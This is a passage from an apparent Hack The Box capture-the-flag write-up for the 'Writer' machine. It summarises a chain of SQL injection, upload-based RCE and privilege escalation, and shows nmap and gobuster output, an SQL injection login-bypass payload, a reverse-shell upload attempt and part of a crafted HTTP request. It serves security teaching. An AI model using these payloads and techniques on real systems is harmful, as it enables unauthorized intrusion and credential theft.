0}.lst-kix_d90m61m618oa-2>li{counter-increment:lst-ctn-kix_d90m61m618oa-2}ul.lst-kix_wvj2d3pgipj6-0{list-style-type:none}.lst-kix_d90m61m618oa-8>li{counter-increment:lst-ctn-kix_d90m61m618oa-8}.lst-kix_452ui7xkw1cj-8>li:before{content:"\0025a0  "}.lst-kix_3suwmg6ak374-3>li:before{content:"" counter(lst-ctn-kix_3suwmg6ak374-3,decimal) ". "}.lst-kix_452ui7xkw1cj-6>li:before{content:"\0025cf  "}.lst-kix_4odmxee0jpwg-4>li{counter-increment:lst-ctn-kix_4odmxee0jpwg-4}.lst-kix_3suwmg6ak374-1>li:before{content:"" counter(lst-ctn-kix_3suwmg6ak374-1,lower-latin) ". "}ol.lst-kix_4odmxee0jpwg-2.start{counter-reset:lst-ctn-kix_4odmxee0jpwg-2 0}ol.lst-kix_afphhjvhkxq-8{list-style-type:none}.lst-kix_3cbw9prsclrp-5>li:before{content:"" counter(lst-ctn-kix_3cbw9prsclrp-5,lower-roman) ". "}ol.lst-kix_afphhjvhkxq-7{list-style-type:none}.lst-kix_452ui7xkw1cj-2>li:before{content:"\0025a0  "}ol.lst-kix_afphhjvhkxq-6{list-style-type:none}ol.lst-kix_afphhjvhkxq-5{list-style-type:none}ol.lst-kix_afphhjvhkxq-4{list-style-type:none}.lst-kix_3cbw9prsclrp-7>li:before{content:"" counter(lst-ctn-kix_3cbw9prsclrp-7,lower-latin) ". "}ol.lst-kix_afphhjvhkxq-3{list-style-type:none}ol.lst-kix_j6urpnclzr2v-2.start{counter-reset:lst-ctn-kix_j6urpnclzr2v-2 0}.lst-kix_452ui7xkw1cj-4>li:before{content:"\0025cb  "}ol.lst-kix_afphhjvhkxq-2{list-style-type:none}ol.lst-kix_afphhjvhkxq-1{list-style-type:none}ol.lst-kix_afphhjvhkxq-0{list-style-type:none}.lst-kix_dokz9fyws9pt-0>li:before{content:"\0025cf  "}ol.lst-kix_3suwmg6ak374-4.start{counter-reset:lst-ctn-kix_3suwmg6ak374-4 0}.lst-kix_4odmxee0jpwg-7>li:before{content:"" counter(lst-ctn-kix_4odmxee0jpwg-7,lower-latin) ". "}.lst-kix_cc5tud1vde9p-5>li:before{content:"" counter(lst-ctn-kix_cc5tud1vde9p-5,lower-roman) ". "}li.li-bullet-0:before{margin-left:-18pt;white-space:nowrap;display:inline-block;min-width:18pt}.lst-kix_cc5tud1vde9p-7>li:before{content:"" counter(lst-ctn-kix_cc5tud1vde9p-7,lower-latin) ". "}.lst-kix_7jxhi2va7kgl-0>li{counter-increment:lst-ctn-kix_7jxhi2va7kgl-0}ol.lst-kix_j6urpnclzr2v-3.start{counter-reset:lst-ctn-kix_j6urpnclzr2v-3 0}.lst-kix_3cbw9prsclrp-2>li{counter-increment:lst-ctn-kix_3cbw9prsclrp-2}.lst-kix_cc5tud1vde9p-5>li{counter-increment:lst-ctn-kix_cc5tud1vde9p-5}.lst-kix_7jxhi2va7kgl-6>li{counter-increment:lst-ctn-kix_7jxhi2va7kgl-6}.lst-kix_j6urpnclzr2v-7>li{counter-increment:lst-ctn-kix_j6urpnclzr2v-7}ol.lst-kix_3cbw9prsclrp-0.start{counter-reset:lst-ctn-kix_3cbw9prsclrp-0 0}ol.lst-kix_4odmxee0jpwg-3.start{counter-reset:lst-ctn-kix_4odmxee0jpwg-3 0}.lst-kix_j6urpnclzr2v-1>li{counter-increment:lst-ctn-kix_j6urpnclzr2v-1}ol{margin:0;padding:0}table td,table th{padding:0}.c17{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#d0d0d0;border-top-width:1pt;border-right-width:1pt;border-left-color:#d0d0d0;vertical-align:top;border-right-color:#d0d0d0;border-left-width:1pt;border-top-style:solid;background-color:#f3f3f3;border-left-style:solid;border-bottom-width:1pt;width:468pt;border-top-color:#d0d0d0;border-bottom-style:solid}.c65{padding-top:20pt;border-bottom-color:#000000;border-bottom-width:1pt;padding-bottom:2pt;line-height:1.5;border-bottom-style:solid;page-break-after:avoid;text-align:left}.c23{color:#000000;font-weight:700;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:"Roboto Mono";font-style:normal}.c5{padding-top:0pt;padding-bottom:0pt;line-height:1.5;orphans:2;widows:2;text-align:left;height:11pt}.c9{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:"Roboto Mono";font-style:normal}.c15{padding-top:20pt;padding-bottom:3pt;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.c7{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:"Arial";font-style:normal}.c19{color:#980000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:42pt;font-family:"Roboto Mono";font-style:normal}.c32{color:#6d9eeb;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:14pt;font-family:"Roboto Mono";font-style:normal}.c30{color:#0b5394;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:18pt;font-family:"Roboto Mono";font-style:normal}.c4{color:#0b5394;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:16pt;font-family:"Roboto Mono";font-style:normal}.c10{padding-top:0pt;padding-bottom:0pt;line-height:1.5;orphans:2;widows:2;text-align:left}.c0{padding-top:4pt;padding-bottom:0pt;line-height:1.0;orphans:2;widows:2;text-align:left}.c49{color:#073763;text-decoration:none;vertical-align:baseline;font-size:18pt;font-style:normal}.c59{margin-left:72pt;padding-top:0pt;padding-bottom:0pt;line-height:1.5;text-align:left}.c58{padding-top:6pt;padding-bottom:0pt;line-height:1.5;page-break-after:avoid;text-align:center}.c27{margin-left:36pt;padding-top:3pt;padding-bottom:0pt;line-height:1.0;text-align:left}.c41{padding-top:0pt;padding-bottom:0pt;line-height:1.5;text-align:right;height:11pt}.c38{padding-top:20pt;padding-bottom:3pt;line-height:1.15;page-break-after:avoid;text-align:left}.c60{color:#4a86e8;text-decoration:none;vertical-align:baseline;font-size:18pt;font-style:normal}.c42{margin-left:18pt;padding-top:3pt;padding-bottom:0pt;line-height:1.0;text-align:left}.c16{background-color:#f3f3f3;font-family:"Roboto Mono";color:#cc0000;font-weight:400}.c29{text-decoration-skip-ink:none;-webkit-text-decoration-skip:none;color:#1155cc;text-decoration:underline}.c1{padding-top:0pt;padding-bottom:0pt;line-height:1.15;text-align:left}.c31{padding-top:10pt;padding-bottom:4pt;line-height:1.0;text-align:left}.c62{color:#073763;text-decoration:none;vertical-align:baseline;font-style:normal}.c25{color:#000000;text-decoration:none;vertical-align:baseline;font-style:normal}.c61{padding-top:0pt;padding-bottom:3pt;line-height:1.5;text-align:left}.c8{padding-top:0pt;padding-bottom:0pt;line-height:1.5;text-align:center}.c69{padding-top:10pt;padding-bottom:0pt;line-height:1.5;text-align:center}.c13{border-spacing:0;border-collapse:collapse;margin-right:auto}.c56{padding-top:0pt;padding-bottom:0pt;line-height:1.0;text-align:left}.c57{padding-top:10pt;padding-bottom:0pt;line-height:1.0;text-align:left}.c14{font-size:16pt;font-family:"Roboto Mono";font-weight:400}.c55{background-color:#ffffff;max-width:468pt;padding:72pt 72pt 72pt 72pt}.c28{font-weight:400;font-size:12pt;font-family:"Roboto Mono"}.c47{color:#666666;text-decoration:none;vertical-align:baseline}.c67{color:#000000;text-decoration:none;vertical-align:baseline}.c11{font-family:"Consolas";color:#006666;font-weight:700}.c44{font-size:18pt;color:#000000;font-weight:400}.c66{font-size:18pt;color:#073763}.c24{padding:0;margin:0}.c2{font-weight:400;font-family:"Consolas"}.c64{font-size:9pt;color:#4a86e8}.c36{font-weight:400;font-family:"Roboto Mono"}.c39{font-weight:400;font-family:"Arial"}.c18{font-family:"Consolas";font-weight:700}.c21{margin-left:72pt;padding-left:0pt}.c52{width:33%;height:1px}.c3{color:inherit;text-decoration:inherit}.c26{orphans:2;widows:2}.c53{margin-left:36pt;padding-left:0pt}.c20{color:#00aaaa}.c34{color:#6d9eeb}.c37{font-weight:700}.c12{color:#0080ff}.c48{font-family:"Roboto Mono"}.c43{color:#990000}.c35{font-size:10pt}.c68{font-size:18pt}.c40{color:#85200c}.c33{height:0pt}.c46{color:#006666}.c50{color:#8e7cc3}.c70{font-size:13pt}.c63{color:#936ec1}.c6{color:#924b72}.c54{font-size:11pt}.c45{font-style:italic}.c22{height:16pt}.c51{height:11pt}.title{padding-top:10pt;color:#980000;font-size:42pt;padding-bottom:0pt;font-family:"Roboto Mono";line-height:1.0;page-break-after:avoid;orphans:2;widows:2;text-align:center}.subtitle{padding-top:6pt;color:#666666;font-size:13pt;padding-bottom:0pt;font-family:"Roboto Mono";line-height:1.3;page-break-after:avoid;font-style:italic;orphans:2;widows:2;text-align:center}li{color:#000000;font-size:11pt;font-family:"Arial"}p{margin:0;color:#000000;font-size:11pt;font-family:"Arial"}h1{padding-top:20pt;color:#0b5394;font-size:16pt;padding-bottom:3pt;font-family:"Roboto Mono";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h2{padding-top:20pt;color:#0b5394;font-size:16pt;padding-bottom:3pt;font-family:"Roboto Mono";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h3{padding-top:20pt;color:#6d9eeb;font-size:14pt;padding-bottom:3pt;font-family:"Roboto Mono";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h4{padding-top:8pt;color:#936ec1;font-size:12.5pt;padding-bottom:2pt;font-family:"Roboto Mono";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h5{padding-top:2pt;color:#6aa84f;font-size:12pt;padding-bottom:0pt;font-family:"Roboto Mono";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h6{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;font-style:italic;orphans:2;widows:2;text-align:left}</style></head><body class="c55"><div><h1 class="c15 c22" id="h.li0bjdopo6z"><span class="c4"></span></h1></div><p class="c26 c69 title" id="h.nj23sjpj5u97"><span>&nbsp;Writer</span></p><p class="c59"><span class="c36 c64">&nbsp; &nbsp;</span><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 345.92px; height: 358.88px;"><img alt="" src="images/image3.png" style="width: 345.92px; height: 358.88px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c8"><span class="c36 c66">0xd4y</span></p><p class="c8"><span class="c14">August 22, 2021</span></p><p class="c5"><span class="c25 c39 c70"></span></p><p class="c26 c61"><span class="c14 c62">0xd4y Writeups</span></p><p class="c10"><span class="c37 c48">LinkedIn: </span><span class="c29 c36"><a class="c3" href="https://www.google.com/url?q=https://www.linkedin.com/in/segev-eliezer/&amp;sa=D&amp;source=editors&amp;ust=1653890599852076&amp;usg=AOvVaw3CUJqRTrq6utAHwjrmLF40">https://www.linkedin.com/in/segev-eliezer/</a></span><span class="c25 c28">&nbsp;</span></p><p class="c10"><span class="c37 c48">Email: </span><span class="c29 c36"><a class="c3" href="mailto:0xd4yWriteups@gmail.com">0xd4yWriteups@gmail.com</a></span></p><p class="c10"><span class="c37 c48">Web:</span><span class="c36">&nbsp;</span><span class="c29 c36"><a class="c3" href="https://www.google.com/url?q=https://0xd4y.github.io/Writeups/&amp;sa=D&amp;source=editors&amp;ust=1653890599852918&amp;usg=AOvVaw22NwgN18vyMqvy_KvO1zUu">https://0xd4y.github.io/</a></span><span class="c36">&nbsp;</span></p><p class="c5"><span class="c25 c36 c35"></span></p><p class="c26 c58 subtitle" id="h.w9t2eo5tqv60"><span class="c14 c45 c47">Table of Contents</span></p><p class="c0"><span class="c23"><a class="c3" href="#h.2gk743bl4yws">Executive Summary</a></span><span class="c23">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c23"><a class="c3" href="#h.2gk743bl4yws">2</a></span></p><p class="c26 c57"><span class="c23"><a class="c3" href="#h.fghdla5fgquk">Attack Narrative</a></span><span class="c23">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c23"><a class="c3" href="#h.fghdla5fgquk">3</a></span></p><p class="c42 c26"><span class="c9"><a class="c3" href="#h.5e17enz1cocp">Enumeration</a></span><span class="c9">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c9"><a class="c3" href="#h.5e17enz1cocp">3</a></span></p><p class="c27 c26"><span class="c9"><a class="c3" href="#h.58c2ch507318">Port Enumeration</a></span><span class="c9">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c9"><a class="c3" href="#h.58c2ch507318">3</a></span></p><p class="c27 c26"><span class="c9"><a class="c3" href="#h.6io3z78bqws5">Web Enumeration</a></span><span class="c9">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c9"><a class="c3" href="#h.6io3z78bqws5">4</a></span></p><p class="c42 c26"><span class="c9"><a class="c3" href="#h.x293nzwjnfbk">SQL Injection</a></span><span class="c9">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c9"><a class="c3" href="#h.x293nzwjnfbk">6</a></span></p><p class="c27 c26"><span class="c9"><a class="c3" href="#h.g4h70w2pg84e">Leveraging SQLi to Read Local Files</a></span><span class="c9">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c9"><a class="c3" href="#h.g4h70w2pg84e">9</a></span></p><p class="c42 c26"><span class="c9"><a class="c3" href="#h.ipxz7iecqxp">Getting RCE</a></span><span class="c9">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c9"><a class="c3" href="#h.ipxz7iecqxp">10</a></span></p><p class="c27 c26"><span class="c9"><a class="c3" href="#h.qinf94u9q24o">Source Code Analysis</a></span><span class="c9">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c9"><a class="c3" href="#h.qinf94u9q24o">10</a></span></p><p class="c26 c27"><span class="c9"><a class="c3" href="#h.eswqky3qu6hx">Finding RCE Vulnerability</a></span><span class="c9">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c9"><a class="c3" href="#h.eswqky3qu6hx">14</a></span></p><p class="c27 c26"><span class="c9"><a class="c3" href="#h.y2evuj3gcvwr">Reverse Shell</a></span><span class="c9">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c9"><a class="c3" href="#h.y2evuj3gcvwr">15</a></span></p><p class="c42 c26"><span class="c9"><a class="c3" href="#h.liuipufirkbp">Privilege Escalation</a></span><span class="c9">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c9"><a class="c3" href="#h.liuipufirkbp">16</a></span></p><p class="c27 c26"><span class="c9"><a class="c3" href="#h.hx02jbakg0r0">Kyle</a></span><span class="c9">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c9"><a class="c3" href="#h.hx02jbakg0r0">16</a></span></p><p class="c27 c26"><span class="c9"><a class="c3" href="#h.jq4agn4fei2y">John</a></span><span class="c9">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c9"><a class="c3" href="#h.jq4agn4fei2y">16</a></span></p><p class="c27 c26"><span class="c9"><a class="c3" href="#h.etqhj0aul7pm">Root</a></span><span class="c9">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c9"><a class="c3" href="#h.etqhj0aul7pm">17</a></span></p><p class="c57 c26"><span class="c23"><a class="c3" href="#h.ui1gvqou6arf">Post Exploitation Analysis</a></span><span class="c23">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c23"><a class="c3" href="#h.ui1gvqou6arf">19</a></span></p><p class="c26 c42"><span class="c9"><a class="c3" href="#h.nw8pksu8e5re">SQLi Mitigation (PDO)</a></span><span class="c9">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c9"><a class="c3" href="#h.nw8pksu8e5re">19</a></span></p><p class="c42 c26"><span class="c9"><a class="c3" href="#h.4o6awot3ot4">Image Upload (RCE)</a></span><span class="c9">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c9"><a class="c3" href="#h.4o6awot3ot4">20</a></span></p><p class="c26 c31"><span class="c23"><a class="c3" href="#h.m32hn92j9nqq">Conclusion</a></span><span class="c23">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c23"><a class="c3" href="#h.m32hn92j9nqq">22</a></span></p><p class="c5"><span class="c9"></span></p><p class="c5"><span class="c7"></span></p><p class="c5"><span class="c7"></span></p><p class="c5"><span class="c7"></span></p><p class="c5"><span class="c7"></span></p><p class="c5"><span class="c7"></span></p><p class="c5"><span class="c7"></span></p><p class="c5"><span class="c7"></span></p><p class="c5"><span class="c7"></span></p><p class="c5"><span class="c7"></span></p><h1 class="c26 c65" id="h.2gk743bl4yws"><span class="c25 c36 c68">Executive Summary</span></h1><p class="c5"><span class="c7"></span></p><p class="c10"><span>After enumerating the website, the </span><span class="c16">/administrative</span><span class="c7">&nbsp;page was found which involved a simple login page. The username field is vulnerable to a critical SQL injection, which an attacker could leverage to login as an administrative user, access sensitive local files, and extract usernames and password hashes. </span></p><p class="c5"><span class="c7"></span></p><p class="c10"><span>Following the authentication bypass, an insecure image upload feature could be exploited to gain RCE on the target. After obtaining a shell as the www-data user, escalating privileges to the local kyle user could be done by way of cracking his hash in the </span><span class="c16">dev</span><span>&nbsp;SQL database. The kyle user was part of the </span><span class="c16">filter</span><span class="c7">&nbsp;group which allowed for editing the configuration files of the SMTP service running locally on port 25. Because this service was running as the john user, getting a shell via the service resulted in compromising his account.</span></p><p class="c5"><span class="c7"></span></p><p class="c10"><span>Finally, the john user is part of the </span><span class="c16">management</span><span>&nbsp;group which has access to the apt repository configuration files. A cronjob running as root which performed a frequent </span><span class="c16">apt-get update</span><span>&nbsp;command could therefore be taken advantage of, and obtaining root privileges was possible through adding a reverse shell file in the apt configurations. Please view the </span><span class="c29"><a class="c3" href="#h.ui1gvqou6arf">Post Exploitation Analysis</a></span><span>&nbsp;and </span><span class="c29"><a class="c3" href="#h.m32hn92j9nqq">Conclusion</a></span><span>&nbsp;</span><span class="c7">sections to see remediations for these vulnerabilities</span></p><p class="c5"><span class="c7"></span></p><p class="c5"><span class="c7"></span></p><p class="c5"><span class="c7"></span></p><p class="c5"><span class="c7"></span></p><p class="c5"><span class="c7"></span></p><p class="c5"><span class="c7"></span></p><p class="c5"><span class="c7"></span></p><p class="c5"><span class="c7"></span></p><p class="c5"><span class="c7"></span></p><h1 class="c65 c26" id="h.fghdla5fgquk"><span class="c44">Attack Narrative</span></h1><p class="c5"><span class="c7"></span></p><p class="c10"><span>No information was provided prior to this engagement, other than the IP address of the target: </span><span class="c16">10.10.11.101</span><span class="c7">.</span></p><h2 class="c38" id="h.5e17enz1cocp"><span class="c4">Enumeration</span></h2><h3 class="c38" id="h.58c2ch507318"><span class="c32">Port Enumeration</span></h3><p class="c10"><span class="c7">To examine potential vulnerabilities, the ports of the target were first scanned:</span></p><a id="t.d08203561391c1b7bfef957767e5dc0e950b6f32"></a><a id="t.0"></a><table class="c13"><tr class="c33"><td class="c17" colspan="1" rowspan="1"><p class="c1"><span class="c2"># Nmap 7.91 scan initiated Tue Aug 17 14:52:04 2021 </span><span class="c11">as</span><span class="c2">: nmap -sC -sV -oA nmap/nmap 10.10.11.101<br>Nmap scan report </span><span class="c11">for</span><span class="c2">&nbsp;10.10.11.101<br>Host is up (0.065s latency).<br>Not shown: 996 closed ports<br>PORT &nbsp; &nbsp;STATE SERVICE &nbsp; &nbsp; VERSION<br>22/tcp &nbsp;open &nbsp;ssh &nbsp; &nbsp; &nbsp; &nbsp; OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>| &nbsp; 3072 98:20:b9:d0:52:1f:4e:10:3a:4a:93:7e:50:bc:b8:7d (RSA)<br>| &nbsp; 256 10:04:79:7a:29:74:db:28:f9:ff:af:68:df:f1:3f:34 (ECDSA)<br>|_ &nbsp;256 77:c4:86:9a:9f:33:4f:da:71:20:2c:e1:51:10:7e:8d (ED25519)<br>80/tcp &nbsp;open &nbsp;http &nbsp; &nbsp; &nbsp; &nbsp;Apache httpd 2.4.41 ((Ubuntu))<br>|_http-server-header: Apache/2.4.41 (Ubuntu)<br>|_http-title: Story Bank | Writer.HTB<br>139/tcp open &nbsp;netbios-ssn Samba smbd 4.6.2<br>445/tcp open &nbsp;netbios-ssn Samba smbd 4.6.2<br>Service </span><span class="c11">Info</span><span class="c2">: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>Host script results:<br>|_clock-skew: 32s<br>|_nbstat: NetBIOS name: WRITER, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)<br>| smb2-security-mode: <br>| &nbsp; 2.02: <br>|_ &nbsp; &nbsp;Message signing enabled but not required<br>| smb2-</span><span class="c11">time</span><span class="c2">: <br>| &nbsp; date: 2021-08-17T19:52:51<br>|_ &nbsp;start_date: N/A<br><br>Service detection performed. Please report any incorrect results </span><span class="c11">at</span><span class="c2">&nbsp;https://nmap.org/submit/ .<br># Nmap done </span><span class="c11">at</span><span class="c2">&nbsp;Tue Aug 17 14:52:20 2021 -- 1 IP address (1 host up) scanned </span><span class="c11">in</span><span class="c2">&nbsp;15.70 seconds</span></p></td></tr></table><p class="c5"><span class="c7"></span></p><p class="c10"><span class="c7">From the nmap scan, it is apparent that the SSH, HTTP, and SMB services are running on the target. &nbsp;The SMB service is of interest, however there is no anonymous access to any of the shares:</span></p><p class="c10"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 90.67px;"><img alt="" src="images/image1.png" style="width: 624.00px; height: 90.67px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c10"><span class="c7">Seeing as all of the services are up to date, it follows that the HTTP service must be searched for potential vulnerabilities.</span></p><h3 class="c15" id="h.6io3z78bqws5"><span class="c32">Web Enumeration</span></h3><p class="c10"><span class="c7">Users visiting the target&rsquo;s web server are met with the following home page:</span></p><p class="c10"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 428.00px;"><img alt="" src="images/image4.png" style="width: 624.00px; height: 428.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c10"><span>Enumerating the directories of the webpage with gobuster</span><sup><a href="#ftnt1" id="ftnt_ref1">[1]</a></sup><span class="c7">, the following directories are found:</span></p><a id="t.14378a6e7cd4b6a522ce4805d0f529209c0dffea"></a><a id="t.1"></a><table class="c13"><tr class="c33"><td class="c17" colspan="1" rowspan="1"><p class="c1"><span class="c2">/contact &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;(</span><span class="c11">Status</span><span class="c2">: 200) [</span><span class="c11">Size</span><span class="c2">: 4905]<br>/logout &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; (</span><span class="c11">Status</span><span class="c2">: 302) [</span><span class="c11">Size</span><span class="c2">: 208] [--&gt; http://10.10.11.101/]<br>/about &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;(</span><span class="c11">Status</span><span class="c2">: 200) [</span><span class="c11">Size</span><span class="c2">: 3522]<br>/static &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; (</span><span class="c11">Status</span><span class="c2">: 301) [</span><span class="c11">Size</span><span class="c2">: 313] [--&gt; http://10.10.11.101/static/]<br>/. &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;(</span><span class="c11">Status</span><span class="c2">: 200) [</span><span class="c11">Size</span><span class="c2">: 11971]<br>/dashboard &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;(</span><span class="c11">Status</span><span class="c2">: 302) [</span><span class="c11">Size</span><span class="c2">: 208] [--&gt; http://10.10.11.101/]<br>/server-</span><span class="c11">status</span><span class="c2">&nbsp; &nbsp; &nbsp; &nbsp; (</span><span class="c11">Status</span><span class="c2">: 403) [</span><span class="c11">Size</span><span class="c2">: 277]<br>/administrative &nbsp; &nbsp; &nbsp; (</span><span class="c11">Status</span><span class="c2">: 200) [</span><span class="c11">Size</span><span class="c2">: 1443]</span></p></td></tr></table><p class="c5"><span class="c7"></span></p><p class="c10"><span>A directory of particular interest is </span><span class="c16">/administrative</span><span class="c7">, especially since it cannot be found without brute forcing directories. Visiting this directory reveals a simple login form which asks for a username and password:</span></p><p class="c10"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 311.00px; height: 367.00px;"><img alt="" src="images/image2.png" style="width: 311.00px; height: 367.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c10"><span class="c35 c45">Note the domain of the target (namely writer.htb). However, no virtual host routing is present.</span></p><h2 class="c15" id="h.x293nzwjnfbk"><span class="c4">SQL Injection</span></h2><p class="c10"><span>When inputting </span><span class="c16">&rsquo;OR 1=1-- -</span><span class="c7">&nbsp;as the username and choosing a random value for the password, the user is automatically authenticated, thus confirming the presence of SQL injection. As an authenticated user, stories can be edited and created, and pictures can be uploaded:</span></p><p class="c10"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 390.67px;"><img alt="" src="images/image5.png" style="width: 624.00px; height: 390.67px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c5"><span class="c7"></span></p><p class="c10"><span>The web page does not properly check if an uploaded file is an image, as it was possible to upload a reverse shell by the name of </span><span class="c16">php-reverse-shell.jpg.php</span><span class="c7">. This, however, did not lead to RCE as the web page nevertheless treated the file as an image. Furthermore, uploading a malicious image with PHP code did not work. </span></p><p class="c5"><span class="c7"></span></p><p class="c10"><span class="c7">An addition to the image upload feature is the ability to upload files given a url. This could be utilized to cause the server to perform GET requests to an arbitrary website of the user&rsquo;s choice:</span></p><p class="c8 c26"><span class="c36"><br>Request</span></p><a id="t.c9bb840e9466324132ae8c1b7bdaf391c2e1bf56"></a><a id="t.2"></a><table class="c13"><tr class="c33"><td class="c17" colspan="1" rowspan="1"><p class="c1"><span class="c11">POST</span><span class="c2">&nbsp;</span><span class="c2 c12">/dashboard/stories/add</span><span class="c2">&nbsp;HTTP/1.1<br></span><span class="c2 c6">Host</span><span class="c2">: 10.10.11.101<br></span><span class="c2 c6">User-Agent</span><span class="c2">: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0<br></span><span class="c2 c6">Accept</span><span class="c2">: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8<br></span><span class="c2 c6">Accept-Language</span><span class="c2">: en-US,en;q=0.5<br></span><span class="c2 c6">Accept-Encoding</span><span class="c2">: gzip, deflate<br></span><span class="c2 c6">Content-Type</span><span class="c2">: multipart/form-data; boundary=---------------------------12417370376638841362770592069<br></span><span class="c2 c6">Content-Length</span><span class="c2">: 850<br></span><span class="c2 c6">Origin</span><span class="c2">: http://10.10.11.101<br></span><span class="c2 c6">DNT</span><span class="c2">: 1<br></span><span class="c2 c6">Connection</span><span class="c2">: close<br></span><span class="c2 c6">Referer</span><span class="c2">: http://10.10.11.101/dashboard/stories/add<br></span><span class="c2 c6">Cookie</span><span class="c2">: session=eyJ1c2VyIjoiJ09SIDE9MS0tIC0ifQ.YSLw7w.2OHVWSzrpZAobEiyfxo94ul3lfg<br></span><span class="c2 c6">Upgrade-Insecure-Requests</span><span class="c2">: 1<br></span><span class="c2 c6">Sec-GPC</span><span class="c2">: 1<br><br>-----------------------------12417370376638841362770592069<br>Content-Disposition: form-</span><span class="c11">data</span><span class="c2">; </span><span class="c11">name</span><span class="c2">=</span><span class="c2 c12">&quot;author&quot;</span><span class="c2"><br><br>0xd4y<br>-----------------------------12417370376638841362770592069<br>Content-Disposition: form-</span><span class="c11">data</span><span class="c2">; </span><span class="c11">name</span><span class="c2">=</span><span class="c2 c12">&quot;title&quot;</span><span 